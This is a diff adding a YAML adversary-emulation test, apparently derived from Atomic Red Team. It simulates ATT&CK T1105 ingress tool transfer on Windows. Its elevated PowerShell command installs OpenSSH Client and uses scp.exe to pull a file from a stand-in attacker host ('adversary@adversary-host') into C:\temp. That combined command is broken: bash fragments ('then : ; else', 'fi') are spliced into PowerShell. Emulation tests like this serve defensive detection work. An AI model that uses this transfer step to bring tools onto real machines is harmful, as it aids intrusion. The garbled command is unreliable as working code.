@@ -1,0 +1,66 @@
+- id: 401667dc-05a6-4da0-a2a7-acfe4819559c
+  name: Windows pull file using scp.exe
+  description: This test simulates pulling files using SCP on a Windows environment.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    windows:
+      psh:
+        command: 'if (Get-Command scp -ErrorAction SilentlyContinue) {; Write-Output
+          "SCP command is available."; exit 0; } else {; Write-Output "SCP command
+          is not available."; exit 1; }; then : ; else # Define the capability name
+          for OpenSSH Client; $capabilityName = "OpenSSH.Client~~~~0.0.1.0"; try {;
+          # Install the OpenSSH Client capability; Add-WindowsCapability -Online -Name
+          $capabilityName -ErrorAction Stop; Write-Host "OpenSSH Client has been successfully
+          installed." -ForegroundColor Green; } catch {; # Handle any errors that
+          occur during the installation process; Write-Host "An error occurred while
+          installing OpenSSH Client: $_" -ForegroundColor Red; }; fi; scp.exe adversary@adversary-host:/tmp/T1105.txt
+          C:\temp'
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1105
+  - atomic-red-team
+  - command-and-control
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      remote_path:
+        description: Path of folder to pull
+        type: path
+        default: /tmp/T1105.txt
+      remote_host:
+        description: Remote host to pull from
+        type: string
+        default: adversary-host
+      local_path:
+        description: Local path to receive files
+        type: path
+        default: C:\temp
+      username:
+        description: User account to authenticate on remote host
+        type: string
+        default: adversary
+    dependencies:
+    - description: 'This test requires the `scp` command to be available on the system.
+
+        '
+      prereq_command: "if (Get-Command scp -ErrorAction SilentlyContinue) {\n    Write-Output\
+        \ \"SCP command is available.\"\n    exit 0\n} else {\n    Write-Output \"\
+        SCP command is not available.\"\n    exit 1\n}\n"
+      get_prereq_command: "# Define the capability name for OpenSSH Client\n$capabilityName\
+        \ = \"OpenSSH.Client~~~~0.0.1.0\"\ntry {\n    # Install the OpenSSH Client\
+        \ capability\n    Add-WindowsCapability -Online -Name $capabilityName -ErrorAction\
+        \ Stop\n    Write-Host \"OpenSSH Client has been successfully installed.\"\
+        \ -ForegroundColor Green\n} catch {\n    # Handle any errors that occur during\
+        \ the installation process\n    Write-Host \"An error occurred while installing\
+        \ OpenSSH Client: $_\" -ForegroundColor Red\n}\n"
+    technique_created: '2017-05-31T21:31:16.408Z'
+    atomic_guid: 401667dc-05a6-4da0-a2a7-acfe4819559c
+    import_timestamp: '2025-06-24T11:15:05.767011Z'
